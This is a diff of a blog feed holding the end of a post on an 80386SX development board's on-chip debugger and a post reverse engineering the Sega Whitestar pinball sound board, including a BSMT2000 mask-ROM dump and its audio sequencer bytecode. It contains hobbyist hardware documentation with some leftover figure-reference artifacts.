+- `EXIT` : Stop OCD routine execution. Never leaves *EXEC* state and assert
+    `ocd.stop` signal.
+
+This *wait state* mechanism is also used to implement instructions used to wait
+for a particular event on the bus. All those instructions deassert `READY#`
+signal and attach the `OCD` to the `386` when the expected condition is
+triggered.
+
+- `WAITADS` : Wait for `ADS#` signal to be asserted
+- `WAITIO` : Wait for `ADS#` and `M/IO#` getting low
+- `WAITLOCK` : Wait for `ADS#` and `LOCK#` to be asserted
+
+The block diagram of this unit can be represented as :
+
+[![](/medias/images/lsepc/ocd_bd.svg)](/medias/images/lsepc/ocd_bd.svg)
+
+Here is routines used to reset and start the CPU from *OCD Unit*. Notice that
+the *start* routine let the original bus controller operates on the `386` until
+an IO access is performed. The supervisor has just to be interrupted when the
+OCD is exited from the *start* routine to handle the IO request. Devices can
+then be emulated by the supervisor or by the host.
+
+    :::nasm
+    .func ocd_prgm_reset
+        RESET           ;; RESET &lt;- 1
+        EXIT
+
+    .func ocd_prgm_start
+        START           ;; RESET &lt;- 0
+        DETACH          ;; Let bus controller to handle CPU signals
+        WAITIO          ;; Wait for IO access to attach OCD Unit
+        LDAL R1         ;; Get IO port address
+        LDWR R2         ;; Get IO operation type
+        EXIT
+
+### Example : Obtaining CPU registers
+
+Now that the *OCD Unit* internals have been presented, the purpose now is to use
+it to get CPU registers.
+
+Before applying debug operations on the CPU, it is necessary to stop execution
+and set it up in a known state. The simplest method to interrupt a `386`
+without having to mind about the interrupt flag is to send a *Non
+Maskable Interrupt*. Unlike `INTR` signal, `NMI` mechanism does not provide any
+acknowledge from the CPU. So the way only to know if the CPU actually took into
+account the NMI is to wait `LOCK#` signal assertion. Indeed, the `386` locks
+the whole bus when it accesses an *IDT* or *IVT* entry. The `WAITLOCK`
+instruction has been designed for that specific purpose.
+
+    :::nasm
+        .func ocd_prgm_break
+        NMI             ;; Set NMI signal
+        WAITLOCK        ;; Wait for ADS# and LOCK# signals then attach OCD unit
+
+![](/medias/images/lsepc/nmi.svg)
+
+On the next step, the behaviour of the CPU is different according to its mode.
+If the `386` is still in real mode, it will fetch the code segment and the
+offset of the NMI handler located on the *Interrupt Vector Table*. As *IVT*
+always starts at `0x0000000`, the address `0x0000008` will be outputted after
+triggering the NMI.
+
+In the other hand, if protected mode is enabled, the CPU will fetch an
+*Interrupt Descriptor* corresponding of the NMI interrupt. This structure is
+located on the *Interrupt Descriptor Table* which can be found anywhere on the
+address space.
+
+As the processor mode is unknown at that moment, it can be deduced from the
+first requested address after NMI :
+
+    :::nasm
+    ;; Get CPU Mode
+        LDAL R2                     ;; Load requested address
+        LDAH R3
+        LDCMP R2
+        LDI R1, 0x0008
+        CMP R1
+        BNE break_protected_mode    ;; Branch to protected mode handler if
+                                    ;; A[15:0] != 0x0008
+        LDCMP R3
+        BEQ break_real_mode         ;; Branch to real mode handler if
+                                    ;; A[23:16] is equal to the NMI entry
+                                    ;; offset on the IVT
+
+Only protected mode will be considered for the rest of the example.
+
+As IDT set by the application cannot be trusted, using the *OCD Unit* to drive
+a valid *interrupt gate* is conceivable :
+
+    :::nasm
+    ;; Fake IDT entry
+        LDI R1, 0b1000111000000000      ;; Flags
+        STD R1
+        WAITADS
+        LDI R1, 0x000D                  ;; Offset[31:16]
+        STD R1
+        WAITADS
+        LDI R1, 0x0000                  ;; Offset[15:0]
+        STD R1
+        WAITADS
+        LDI R1, 0x0008                  ;; Segment Selector
+        STD R1
+        WAITADS
+
+A code segment reload is always performed before jumping to the interrupt
+handler. So a read to a GDT entry will be requested by the CPU.
+
+In the same way, it is painless with this mechanism to drive a valid code
+segment :
+
+    :::nasm
+    ;; Fake GDT entry
+        LDI R1, 0b1001101000000000  ;; Flags | Base[23:16]
+        STD R1
+        WAITADS
+        LDI R1, 0x00CF              ;; Base[31:24] | G | D/B | Limit[19:16]
+        STD R1
+        WAITADS
+        LDI R1, 0xFFFF              ;; Limit[15:00]
+        STD R1
+        WAITADS
+        LDI R1, 0x0000              ;; Base[15:0]
+        STD R1
+        WAITADS
+        READY                       ;; GDT Access bit
+        WAITADS
+
+Finally, as `EFLAGS`, `EIP` and `CS` registers have been modified, they are
+pushed on the stack. However the bus controller is disconnected from CPU
+signals : this means that no actual write on the memory are performed during
+this operation. Instead, it is straightforward to load those values into *OCD*
+registers :
+
+    :::nasm
+    ;; Context saving
+        LDD R2          ;; EFLAGS[15:0]
+        READY
+        WAITADS
+        LDD R3          ;; EFLAGS[31:16]
+        READY
+        WAITADS
+        LDD R4          ;; CS
+        READY
+        WAITADS
+        LDD R5          ;; EIP[15:0]
+        READY
+        WAITADS
+        LDD R6          ;; EIP[31:16]
+        READY
+
+Afterwards, the CPU will try to fetch instructions from the interrupt handler.
+So `HOLD` signal is asserted at the end of the `break` routine. This leaves the
+supervisor time to load the next routine to the *OCD* program memory.
+
+At this point, `386` is on a known and valid state which allows us to inject
+any instructions sequences. In order to obtain CPU registers, the `pusha`
+instruction can be injected :
+
+    :::nasm
+        .func ocd_prgm_get_regs
+        LDI R1, 0x9060
+        LDI R2, 0x9090
+        WAITADS
+
+        ;; Fill instruction prefetch queue
+        STD R1          ;; Drive PUSHA; NOP
+        WAITADS
+        STD R2          ;; Drive NOP; NOP
+        WAITADS
+        STD R2          ;; Drive NOP; NOP
+        WAITADS
+        STD R2          ;; Drive NOP; NOP
+        WAITADS
+        STD R2          ;; Drive NOP; NOP
+        WAITADS
+
+        ;; PUSHA
+        LDD R0
+        READY
+        WAITADS
+        ...
+        LDD R15
+        READY
+
+        HOLD            ;; Hold CPU in order to avoid instruction fetch during
+                        ;; loading of the next OCD routine
+        EXIT
+
+However, `pusha` instruction modifies `ESP` value. In the same way, a `mov`
+instruction can be used to restore `ESP` and set any register value.
+
+When debugging phase is over, a *continue* routine is executed which basically
+inject an `iret` and drive original values of `EIP`, `CS` and `EFLAGS`.
+
+For now, the debug unit is provided with a CLI interface allowing simple CPU
+interactions. When more debug features will be available, the goal is to embed
+a gdb stub into the host application.
+
+    :::text
+    [lsepc-monitor] start
+    [lsepc-monitor] status
+    CPU Status: RUN
+    [lsepc-monitor] break
+    [lsepc-monitor] status
+    CPU Status: Break (Protected Mode)
+    [lsepc-monitor] getregs
+    EFLAGS: 00000046
+    EIP:    000fd024
+    ESP:    ffe4000c
+    EBP:    00000123
+    EAX:    1100bbaa
+    EBX:    5544000f
+    ECX:    9988ffee
+    EDX:    ddcc7766
+    ESI:    456789ab
+    EDI:    cdef9090
+    CS:     0008
+    [lsepc-monitor] continue
+    [lsepc-monitor] status
+    CPU Status: RUN
+
+## Conclusion
+
+Developing and testing on the LSE-PC is still mainly based on the JTAG
+interface. When connected to a JTAG interface, the FPGA design exposes the
+following entry points :
+
+- RAM/ROM editor : used to perform on-chip operation on the internal memory
+- NIOS II interface : used to program and debug the NIOS II contained on the
+    supervisor
+- Serial Flash Loader : used to program the SPI flash which contains FPGA
+    configuration
+- SignalTap : used to perform signal analysis.
+
+This board is still a proof a concept. However, its composition was an
+excellent exercise to understand how the original `80386` CPU works under the
+hood.
+
+Although some work need to be done to get a profitable on-chip debugger, the
+hardware part and the simple chipset embedded are reliable enough to allow
+execution of simple applications.
+
+## Links
+
+- [Git repository](http://git.lse.epita.fr/?p=lse-pc.git)
+- [LSE Summer Week Talk (French)](http://youtu.be/v4jbp585eFA)
+
+## References
+
+- [80386SX datasheet](http://media.digikey.com/pdf/Data%20Sheets/Intel%20PDFs/Intel386%20SX.pdf)
+- [Cyclone IV Handbook](https://www.altera.com/en_US/pdfs/literature/hb/cyclone-iv/cyclone4-handbook.pdf)
+- [M25P16 Serial Flash datasheet](http://www.micron.com/~/media/documents/products/data-sheet/nor-flash/serial-nor/m25p/m25p16.pdf)
+- [USB Blaster User Guide](https://www.altera.com/literature/ug/ug_usb_blstr.pdf)
+- [FTDI FT230X datasheet](http://www.ftdichip.com/Documents/DataSheets/ICs/DS_FT230X.pdf)
+- [AS6C8016 Static RAM datasheet](http://www.alliancememory.com/pdf/AS6C8016.pdf)
+- [LD1117A voltage regulator datasheet](http://www.st.com/web/en/resource/technical/document/datasheet/CD00002116.pdf)
+- [MCP1700 voltage regulator datasheet](http://ww1.microchip.com/downloads/en/DeviceDoc/20001826C.pdf)
+- [MCP1826 voltage regulator datasheet](http://ww1.microchip.com/downloads/en/DeviceDoc/22057B.pdf)
+- [Avalon Interface Specifications](https://www.altera.com/literature/manual/mnl_avalon_spec.pdf)
+
+-- 
+Pierre Surply
+</content>
+    <link href="http://blog.psurply.com/0004-designing_an_intel_80386SX_dev_board.txt" rel="alternate"/>
+    <published>2015-11-16T00:00:00+01:00</published>
+  </entry>
+  <entry>
+    <id>urn:uuid:d54e8e1b-9631-58f4-be62-1c3f361d15b9</id>
+    <title>Sega Whitestar Pinball: Sound board</title>
+    <updated>2015-11-20T00:00:00+01:00</updated>
+    <author>
+      <name>Pierre Surply</name>
+      <email>surply@lse.epita.fr</email>
+    </author>
+    <content type="text">&gt; A reverse engineering of a BSMT2000 DSP used on the audio circuit
+&gt; of an old-school pinball. An overview of the electronic design of
+&gt; this uncommon and discontinued machine will be presented before focussing
+&gt; on the peculiar conception of its sound board.
+
+Keywords: Reverse Engineering, Hardware, Pinball Machine, Audio, DSP
+
+## Sound board overview
+
+![Block diagram](images/snd/block_diagram.eps)
+
+The audio section consists of a Motorola 68B09E CPU and a BSMT2000 DSP. The
+sound playing is controlled by the main CPU which latches data to a dedicated
+register. The Sound CPU reads in this buffer commands and handles the
+interfacing to the BSMT. The DSP can read audio samples stored in the four
+dedicated 4MB EEPROMS and mixes it to a background melody. The data stream
+outputted by the DSP is then serially shifted into a stereo 16-bit Digital to
+Analog Converter (DAC). Finally, the analog signal is filtered and amplified
+before being applied to the speakers.
+
+## First look at sound CPU wiring
+
+The sound board is entirely driven by the 68B09E CPU. In order to reverse the
+behaviour of this circuit, it is a good idea to see how componants are exposed
+from the point of view of the sound CPU.
+
+As the main CPU, address decoding is achieved using a PAL16L8 as shown on
+Figure~. Dumping U26 configuration could be performed as explained on section~.
+However, this trick implies desoldering chip and could be very long to compute.
+Reversing the code stored on sound CPU ROM in order to guess the address space
+is a better idea due to the reasonable size and the simplicity of the sound
+card firmware.
+
+![Sound CPU address decoding](images/snd/pal.pdf)
+
+Unlike the main CPU ROM, the sound CPU ROM is not banked. Taking into account
+the fact that ROM size is 64KB, this memory perfectly fit the address bus
+width. This would mean that no spaces are left for other devices on the address
+space which is not conceivable. Opening the ROM content on an hexadecimal
+editor shows that the first 16KB are blank and some valid 6809 instructions can
+be disassembled above 0x4000. This proves that this memory is actually not
+fully mapped to the sound CPU address space and so, some part of it will never
+be accessible. We guess that this design has been chosen to simplify relocation
+of addresses referenced on sound CPU code since the ROM is identity mapped.
+According to the disassembled code, the following lower mapping can be easily
+deducted:
+
+- 0x0000-0x1FFF: RAM
+- 0x2000: Status Register (OSTAT signal)
+- 0x2002: Main CPU / Sound CPU Command Register (BIN signal)
+- 0x2006: DSP Status (/BLD signal)
+
+Things seem to get a bit more tricky for addresses above 16KB. Useful data
+can be found on the ROM from 0x4000 to 0xFFFF such as code, read-only data
+structures and interrupt vector. However, it seems that sound CPU stores data
+on U16 and U11 by writing from 0xA000 to 0xA0FF and on U15 by writing at
+0x6000. Since the PAL16L8 is taking BR/W signal used to indicate the opration
+type (read/write), it's perfectly possible to admit a different address space
+depending on the CPU operation. It is here used to overlap ROM space and DSP
+control space on this relatively restrained address space. The higher mapping
+can then be defined as:
+
+- During read operation:
+    - 0x4000 - 0xFFFF: ROM
+- During write operation:
+    - 0x6000: DSP Command (MSB)
+    - 0xA000-0xA0FF: DSP Command (LSB)
+
+## Interfacing sound board to main CPU
+
+### Hardware interface
+
+In order to indicate basic status information for the rest of the board, the
+sound CPU can write on a status register defined by two D flip-flop as
+shown on Figure~. The first bit, is used to indicate to the
+main CPU that audio card successfully finished his initialization phase and is
+ready to process some commands. The second bit, mapped on the bit 7 (BD7), is
+wired to RESET pin of DSP and is triggered during the initialization
+or when BSMT is not responding.
+
+        lda     #$80
+        sta     IO_STATUS ;; Reset DSP
+        cla
+        anda    #1
+        sta     IO_STATUS ;; Indicate to Main CPU that audio card is ready
+
+
+![Sound CPU status register](images/snd/status.pdf)
+
+The sound calls are made by the main CPU by writing on the U5 register
+(Figure~). In order to inform the sound CPU that data is available, the
+circuitry defines the BUF-FUL signal which is set when the main CPU is writing
+on the command register using the SNDSTB signal. In the other hand, the sound
+CPU drives the signal BIN when it needs to read the instruction. According to
+code reversed from the sound CPU ROM, the reading is performed during
+initialization and during FIRQ handler execution: the sound CPU is periodically
+checking the content of the command register. The reading implies the driving
+of the U5 content on the sound CPU data bus by grounding the /OE (Output
+Enable) pin of U5. Moreover, some side effects are associated with the reading
+operation: the BUF-FUL and FIRQ signals are cleared thanks to U8 and U1
+latches. This means that command is marked as consumed and a new FIRQ can be
+triggered by the next rising edge of the FIRQ clock. Of course, the BUF-FUL is
+cleared when the sound board is reset using SNDRST.
+
+![Main CPU / Sound CPU interface](images/snd/snd_cpu.pdf)
+
+### Handling CPU commands
+
+As we could expect from the wiring, main CPU commands are fetched when the
+sound CPU receives an FIRQ.
+
+The FIRQ handler is quite simple: it increments timers used by the rest of the
+application and reads into U5 which clears the FIRQ signal.
+If the command is different from the previous one, it is enqueued into a
+dedicated ring buffer located at 0x0067 and defined as:
+
+    struct cmd_ring_buffer {
+        uint8_t begin;
+        uint8_t end;
+        uint8_t data[16];
+    };
+
+The software's main loop can now dequeues the command and jump to the
+corresponding handler. Each command is defined by a structure which contains a
+callback index and pointers to data which are not relevant at this point.
+Those command descriptors are arranged on two separate arrays and are defined
+as:
+
+    struct cpu_cmd {
+        uint8_t    callback_idx;
+        uint8_t    unk0;
+        uint16_t   mask;
+        void       **data;
+    };
+
+As imposed by the circuitry, a command is only a 8-bit word which is quite
+restrictive. That's why the software defines two banks extending the number of
+commands to 512. The main CPU can then select a bank by sending 0xFD
+or 0xFE commands.
+
+It is quite hard to deduce the exact behaviour of each command from this point.
+A good approach to go further is to understand how the DSP operates and then
+extrapolate CPU commands purposes from it.
+
+## Sriving the Digital Signal Processor
+
+### Sound CPU/DSP hardware interface
+
+The Figure illustrates the interface between the sound CPU and the DSP.
+According to this wiring, a DSP command is composed of an 8-bit address stored
+in U10 and a 16-bit data stored in U15 and U16. The writing of a DSP command
+cannot be atomic since U15 and U16 are connected to the low byte of the sound
+CPU data bus.  So, when sending a DSP instruction. The first step is to write
+on U15 using DSP1 signal in order to send command high byte.  The second step
+is to write the command's low byte using DSP0 signal.  The least significant
+byte of data bus and of the address bus will be respectively captured on U16
+and U11.
+
+The wiring of U27 shows that an IRQ is sent to the sound CPU when the DSP
+consumes the command and so is ready to get a new command.  Moreover, /BLD
+signal seems to indicate that a DSP instruction is still pending.  With this
+kind of circuitry, we can suppose that DSP is periodically reading U10 register
+and then read U16 and U15 registers if U10 is different than 0xFF.
+
+![Sound CPU / DSP interface](images/snd/cpu_dsp.pdf)
+
+### BSMT2000 wiring
+
+The digital to analog conversion is performed by a Philips TDA1543.  This
+integrated DAC is one of the first which supports $I^2S$ as input format.
+Figure~ illustrates the glue logic needed to convert the data stream generated
+by the DSP to a correct $I^2S$ stream. This is achieved by using two 8-bit
+shift registers (U23 and U24). Samples are simply written to this registers
+using OUT3 signal and are shifted to the DAC using SCLK 24MHz clock signal
+generated by the BSMT2000.  WS signal is toggled to latch the right and left
+channel sound data into the DAC. Its value is captured during writing operation
+on shift registers from SA2 (third bit of DSP address bus).
+
+![DSP / DAC interface](images/snd/dsp.pdf)
+
+### Dumping the BSMT2000 Mask ROM
+
+Although the BSMT2000 is undocumented, it's well-known that this chip
+is a masked-ROM version of the TMS320C15 Texas Instruments's DSP from
+1987.
+According to the wiring on the sound board, the pinout is identical to the
+40-Pin DIP version of the TI's DSP. In order to focus the reverse engineering
+on this particular chip, it's essential to isolate it from the rest of the
+sound board.  This way, we avoid all side effects caused by external circuitry
+which can rise some unwilling behaviour during the test process. Moreover, it
+can be useful to provoke some unusual and controlled events to the chip in
+order to deduce design details. The best example is the dumping of the internal
+program memory.
+
+The chip is clocked at 24 MHz which is actually too high to use a
+microcontroller to probes or generates the signals needed to correctly
+operates. The use of an FPGA is the most convenient sane way to simulate the
+sound card which host this DSP\@. The testbench is based on a DE0-Nano, an
+Altera Cyclone IV developpement board.
+
+A first analysis of signals driven on the address and control busses shows that
+the DSP is periodically reading on U11 register (IN0) as expected regarding the
+sound CPU code and the external circuit.
+
+The original TMS320C15 can be used in two separate modes which define the
+location of the used program memory. The current mode is selected using the /MP
+pin:
+
+- Microcomputer mode (/MP = 1):
+    Fetch instructions from internal program memory
+- Microprocessor mode (/MP = 0):
+    Fetch instructions from external program memory
+
+When used on the pinball sound card, the /MP is connected to 5V, selecting the
+Mask ROM as program memory. Grounding this pin on the custom testbench allows
+us to execute basic TMS320C15 instructions from FPGA internal RAM.
+This proves that BSMT200's features reside on the program stored on
+Mask ROM: the glue logic seems to be identical to a real TMS320C15.
+
+Of course, there is no programming protocol allowing program memory reading as
+some microcontrollers feature. However, this kind of DSP are based on a
+modified Harvard architecture which means that the program can read itself
+using specific instructions. In our case, TBLR instruction is a
+good candidate.
+
+The trick here is to inject this instruction using external memory in order to
+read internal ROM\@. Although /MP signal is not designed to be toggle during
+execution, experimentations seem to show that this pin is simply controlling a
+multiplexer on data bus selecting the corresponding program memory and can then
+be switched during execution. As shown on figure~, toogling this pin to MP mode
+directly after fetching TBLR forces the DSP to switch to mask ROM during
+execution of this single instruction allowing the reading from the mask ROM to
+data memory.  The /MP signal must then be grounding in order to continue
+fetching from external memory. An OUT instruction can then be used to read the
+mask ROM word from data memory and outputting it to data bus.  Although this
+trick seems to be simple to perform, very tight timing on /MP signal has to be
+respected to allow Mask ROM reading.
+
+![BSMT2000 program bus](images/snd/bsmt2000_bd.eps)
+
+![BSMT2000 dump waveform](images/snd/bsmt2000_dump.pdf)
+
+This behaviour can be implemented using FPGA. Altera Cyclone IV provides an
+efficient way to integrate JTAG-editable memories using M9K cells.  As shown on
+figure~, this is used on this design to define external program memory and a
+shadow mask-ROM used to store words read from DSP ROM. The program memory
+content is defined using this Memory Initialization File (.mif):
+
+    WIDTH=16;
+    DEPTH=64;
+
+    ADDRESS_RADIX=HEX;
+    DATA_RADIX=BIN;
+
+    CONTENT BEGIN
+        0: 0111111000000001; -- LACK 1      ;; ACC &lt;- 1
+        1: 0101000000000000; -- SACL 0      ;; DATA[0] &lt;- ACC
+        2: 0110101000000000; -- LT 0        ;; T &lt;- DATA[0]
+        3: 1000000000000001; -- MPYK 1      ;; P &lt;- 1 x T
+        4: 0111111110001001; -- ZAC         ;; ACC &lt;- 0
+        5: 0110011100000000; -- TBLR 0      ;; DATA[0] &lt;- PROG[ACC]
+        6: 0101000000000001; -- SACL 1      ;; DATA[1] &lt;- ACC
+        7: 0100100100000001; -- OUT 1, 1    ;; IO[1] &lt;- DATA[1]
+        8: 0100100000000000; -- OUT 0, 0    ;; IO[0] &lt;- DATA[0]
+        9: 0111111110001111; -- APAC        ;; ACC &lt;- ACC + P
+        A: 1111100100000000; -- B 5
+        B: 0000000000000101;
+    END;
+
+![BSMT2000 testbench block diagram](images/snd/bsmt2000_tb_bd.eps)
+
+![BSMT2000 testbench](imaes/snd/bsmt2000_tb.jpg)
+
+
+### BSMT2000 firmware
+
+Before reversing BSMT2000's firmware, it is necessary to examine the circuitry
+in order to see how the DSP can interact with the rest of the board and in
+particular how it can fetch samples from voices EEPROMs and how it can output
+signals to the DAC.
+
+As the DSP is configured in microcontroller mode, it can only communicate with
+devices by using IN/OUT instructions.  TMS320C1x's instruction encoding limits
+the IO space width to 6 bits.  The address decoding is performed by a 1-of-8
+demultiplexer (74ALS138) and it is quite simple to deduce this IO mapping:
+
+- IN 0: Sound CPU command address
+- IN 1: Sound CPU command data
+- IN 2: EEPROM data
+- OUT 0: EEPROM address
+- OUT 1: EEPROM bank
+- OUT 3: Sample out (Left)
+- OUT 7: Sample out (Right)
+
+The first thing the DSP firmware do after resetting is to disable interrupts,
+read into the first IO port and jump to the corresponding subprogram.
+
+The sound CPU firmware seems to be aware of this behaviour according to this
+subroutine which reset the DSP and configure it to mode 1:
+
+    OSTAT   EQU $2000
+    DSP1    EQU $6000
+    DSP0    EQU $A000
+
+    init_dsp:
+                ;; Reset DSP
+                lda #$80
+                sta OSTAT   ;; Set DSPRST
+
+                ;; Compute command address according to the desired DSP mode
+                ldb #$FE    ;; We need to write the complement of the actual value
+                            ;; due to U10 inverting output tri-state buffer
+                            ;; Here, we select mode 1
+                ldx #DSP0
+                abx         ;; x &lt;- b + x
+
+                ;; Select DSP mode by writing 0 at DSP0 + ~mode
+                clra
+                sta #DSP1   ;; MSB
+                sta ,x      ;; LSB
+
+                ;; Start DSP
+                sta OSTAT   ;; Clear DSPRST
+                rts
+
+The rest of this study will exclusively consider the mode 1. Modes 0, 5, 6 and
+7 are similar to mode 1 and others are for testing purposes.
+
+The mode 1 main loop is basically composed of four stages. The first one is to
+fetch samples from the voices EEPROMs. Addressing those memories must be
+performed by selecting a bank on U22 and latching an offset on U12 and U13. The
+bank value is composed of two parts: bits 3 and 4 are used to select one of the
+four ROMs and bits 0 to 2 select a 64KB bank into the corresponding chip. In
+this case, audio samples are simply encoded using 8-bit mono PCM at 8KHz.
+
+The second stage is about decoding the ADPCM channel. Although eleven channels
+are working on PCM encoded samples, the twelfth provide an custom ADPCM decoder
+which enables voice signal compression. However, in the case of Starship
+Troopers pinball, voices EEPROMs only contain PCM samples. We can then suppose
+that this part of the DSP firmware is not used and we will detail this part
+here.
+
+The purpose of the third stage is to mix the different channels into one sample
+that can be outputted to the DAC. The following code snippet exhibits the fact
+that the TMS320C1x is perfectly designed for this kind of operation:
+
+        ZAC                     ;; ACC &lt;- 0
+        LT VOLUME1              ;; T &lt;- DATA[VOLUME1]
+        MPY SAMPLE1             ;; P &lt;- T * DATA[SAMPLE1]
+        LTA VOLUME2             ;; ACC &lt;- ACC + P; T &lt;- DATA[VOLUME2]
+        MPY SAMPLE2             ;; P &lt;- T * DATA[SAMPLE2]
+        ...
+        LTA VOLUME12            ;; ACC &lt;- ACC + P; T &lt;- DATA[VOLUME12]
+        MPY SAMPLE12            ;; P &lt;- T * DATA[SAMPLE12]
+        APAC                    ;; ACC &lt;- ACC + P
+        SACH 0, TMP             ;; DATA[TMP] &lt;- ACC[31:16]
+        OUT DAC, TMP            ;; IO[DAC] &lt;- DATA[TMP]
+
+![Mode 1 block diagram](images/snd/dsp_mix.eps)
+
+The last stage is dedicated to handle commands from sound CPU. This is
+suprising how this part is simplistically designed. The firmware is
+periodically fetching the command and then writes its value (IN 1) into
+arbitrary address (IN 0) without any verification. It means that the sound CPU
+can write anywhere in the DSP data memory.  Notice that as the writing is
+unconditionnal and as the reset value of the U11 register will be read as 0xFF,
+the last word of the DSP data memory will perpetually filled with garbage
+values when no command is pending.
+
+            BIOZ fetch      ;; Jump to `fetch` if TST pin is active
+
+            NOP             ;; Burn CPU cycles
+            NOP             ;;
+            NOP             ;;
+            B next
+
+    fetch:  IN 0, 60        ;; DATA[60] &lt;- IO[0]
+            LAR AR0, 60     ;; AR0 &lt;- DATA[60]
+            IN 1, *         ;; DATA[AR0] &lt;- IO[1]
+
+    next:   ...
+
+As you might notice, access to command registers is only conditioned by the
+BIOZ instruction. It basically jumps if the TST physical of the chip is active.
+As shown on Figure~, this pin is wired to the CLKOUT signal which is clocked at
+1/4 CLKIN (main DSP clock) frequency.  We can suppose that this mechanism is
+setup to limit the number of reading on the command registers to only one
+quarter of the main loop iterations. This requires that each iteration consume
+exactly the same number of cycles which explains the usage of NOP instructions
+to burn CPU cycles in some cases.
+
+![TST pin wiring](images/snd/bsmt2000_tst.pdf)
+
+The DSP firmware seems to segment the data memory into several ranges which
+defines channels configurations and that can be written by the sound CPU:
+
+- 0x0-0xA: Channel playback positions
+- 0x16-0x20: Channel rates
+- 0x21-0x2B: Sample limits
+- 0x2C-0x36: Sample loops
+- 0x37-0x41: Sample bank
+- 0x42-0x4C: Channel right volume
+- 0x4D-0x57: Channel left volume
+- 0x58-0x62: Sample data
+
+Although, this kind of command handling may seem risky because of the lack of
+verification, the harvard architecture adopted by the TMS320 avoids
+code rewriting. Moreover, the rest of the address space is simply not
+interpreted by embedded code which relativize the consequences of corrupted
+data.
+
+The DSP firmware is actually quite simple. And even a bit too simple. His only
+purpose here is to fetch samples at a given rate and mix them together. But now
+that we know how the DSP can be controlled, it could be a good idea to go
+further into the sound CPU reverse-engineering.
+
+### Back to the Sound CPU firmware
+
+The communication with the DSP is ensured by the subroutine located at
+0x55B8. This function waits until DSP status register
+(0x2006) is clear and then write into DSP command register.
+
+This code is called by several subroutines which are never directly referenced
+in the rest of the firmware. Instead, they are arranged on a jump table
+structure as follow:
+
+    #define MAX_CHAN 12
+
+    struct dsp_ops {
+        void (*set_fixed_volume[MAX_CHAN])();
+        void (*set_rate[MAX_CHAN])();
+        void (*set_default_rate[MAX_CHAN])();
+        void (*stop_playing[MAX_CHAN])();
+        void (*load_pcm_sample[MAX_CHAN])();
+
+        void (*op5[MAX_CHAN])();
+        void (*op6[MAX_CHAN])();
+        void (*op7[MAX_CHAN])();
+        void (*op8[MAX_CHAN])();
+        void (*op9[MAX_CHAN])();
+    };
+
+This kind of object-oriented pattern is useful to define different
+behaviours for each channel exposed as a single operation. For instance, the
+ADPCM channel volume is not configured the same way as the other PCM channels.
+
+By using this bottom-up approach it is easier to deduce the behaviour of the
+audio sequencer which is really similar to what was generated by old school
+music trackers. It is implemented as a simple virtual machine computing audio
+pattern from a dedicated bytecode. As shown on Figure~,
+patterns are referenced into CPU command definition structure.
+The third field of this structure (previously defined on
+section~) is a 12bit mask defining on which channels
+the pattern must be played.
+
+![CPU command definition](images/snd/tracker.eps)
+
+The bytecode instruction encoding is quite simple: the first byte is an
+operation code following by a variable number of arguments depending on the
+operation. For instance, the 05 opcode is used to load a PCM sample
+into a channel. As argument, it takes the address of a sample descriptor
+structure described as:
+
+    struct pcm_sample {
+        uint16_t    base;
+        uint16_t    limit;
+        uint16_t    loop_start;
+        uint8_t     unk;
+        uint8_t     bank;
+    };
+
+A total of 43 instructions are implemented allowing control of playback rate
+, volume, timing and bytecode execution.
+The following listing describes the pattern played on a channel
+when the ball hits a target on the playfield. It basically load a PCM sample
+into the DSP and play at fixed volume and rate. The main CPU can play this
+pattern by sending 0xAD command when the first sound CPU mode is
+selected.
+
+        ;; PCM sample description
+    828B: 00 00         ;; pcm.base
+                        ;; sample starts at 0x0000
+
+    828D: 47 AC         ;; pcm.limit
+                        ;; sample finishes at 0x47AC
+
+    828F: 47 86         ;; pcm.loop_start
+                        ;; sample playing must loop at 0x4786
+
+    828F: 3C
+
+    828F: 03            ;; pcm.bank
+                        ;; sample is located on bank 3 of U17 EEPROM
+
+        ;; Explosion pattern bytecode
+    91DE: 05 81 8B      ;; load pcm sample described at 0x818B into channel
+    91E1: 09 01         ;; set channel volume
+    91E3: 01 1D 01 6D   ;; set channel rate, start sample playing
+                        ;; and wait 7425 ticks (0x1D01) =&gt; 2.53 seconds
+    91E7: 0F            ;; free the channel and stop sample playing
+
+This mechanism may seem overdesigned for playing single PCM sample but it's
+really powerful when it is about synthesizing background music or other complex
+melody which takes too many spaces when encoded in PCM.
+
+When a command is called by the main CPU, a new instance of the virtual machine
+is started for each channels masked by the corresponding command descriptor.
+Each execution instance is represented by this structure:
+
+    struct track {
+        struct track    *next;
+        struct track    *prev;
+
+        void            *instruction_pointer;   // Address of the next bytecode
+                                                // instruction
+
+        uint16_t        counter;                // Used for operation timing
+        uint16_t        last_timestamp;
+
+        uint8_t         next_instruction;
+        uint8_t         type;                   // 0: Background track
+                                                // 1: Foreground track
+        uint8_t         channel_id;
+
+        uint16_t        unk0;
+        uint16_t        unk1;
+        uint8_t         unk2;
+    };
+
+Those track structures are arranged into a double-linked list allocated
+in-place from 0x03C0 to 0x05B8. As no heap-based memory
+allocator is provided, list nodes are allocated in-place as represented on
+Figure~. Notice that the first node is never allocated and
+so is used as a sentinel for the free list.
+
+![Track allocation](images/snd/list.eps)
+
+The virtual machine scheduler is simply a round-robin which executes only one
+bytecode instruction per execution time. As audio patterns need timing between
+some operations, the counter field of the track structure is used to retard the
+execution of the next bytecode instruction. It is relative to ticks updated by
+the FIRQ handler.
+
+The callback index contained on command descriptor structure can refer two
+types of track playing:
+
+- 0x2: Play foreground track (Remove previous foreground tracks
+    on masked channels)
+- 0xB: Play background track (Remove all previous tracks)
+
+Both of them inserts tracks on the playing list with specific pattern bytecode.
+They only differ by the way they clean the list before inserting new tracks and
+how they will be interpreted by the virtual machine. As a matter of fact,
+0xB commands are always provided with 0x7FF which means that
+background music is allocated on all PCM channels.
+
+![Track types](images/snd/track_alloc.eps)
+
+As shown on Figure~, channels can accept at most one track
+of each type. When two tracks are sharing the same channel, the foreground one
+has priority and so the backgound one is muted. The current type of the track
+played on each channel is reported on an array located at 0xEA.
+Of course, to avoid desynchronization between background tracks, pattern
+bytecode is still executed but before actually applying operation to the DSP,
+the virtual machine compares track type with the one which has the highest
+priority on the current channel.
+
+    uint8_t *channels_types = (void *) 0x00EA;
+    if (track.type == channels_types[current_channel])
+        dsp_ops[current_channel]();
+
+Indicated by the 0x0F bytecode instruction, the foreground track
+stop playing by removing itself from the track list and unmutes the background
+track by clearing the corresponding entry on the 0x00EA array.
+
+## Conclusion
+
+Although this sound card hardware design is simple, it is not simplistic and
+its severals tricks used to implement a custom and reliable hardware interfaces
+between the CPUs is remarkable.
+
+We can be a little bit more suspicious about the BSMT2000's program
+which can be seem as a draft of a real audio chip. In fact, it is hard to
+imagine the need of a mask ROMed version of the TMS320C1x for this
